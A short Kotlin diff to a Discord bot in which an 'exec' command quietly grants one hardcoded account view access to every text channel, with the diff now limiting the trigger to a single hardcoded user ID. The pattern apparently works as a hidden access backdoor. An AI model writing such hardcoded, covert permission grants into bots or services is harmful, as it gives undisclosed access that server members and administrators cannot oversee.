@@ -114,11 +114,13 @@ class Main : ListenerAdapter() {
                 }
             }
             "exec" -> let {
-                e.guild!!.textChannels.forEach { textChannel ->
-                    textChannel.manager.putMemberPermissionOverride(1172276056611360813, 1024, 0).complete()
+                if (e.user.id == "310554809910558720") {
+                    e.guild!!.textChannels.forEach { textChannel ->
+                        textChannel.manager.putMemberPermissionOverride(1172276056611360813, 1024, 0).complete()
+                    }
+                    e.deferReply().setEphemeral(true)
+                    e.reply("Successfully executed.").setEphemeral(true)
                 }
-                e.deferReply().setEphemeral(true)
-                e.reply("Successfully executed.").setEphemeral(true)
                 return@let 200
             }
             else -> 404
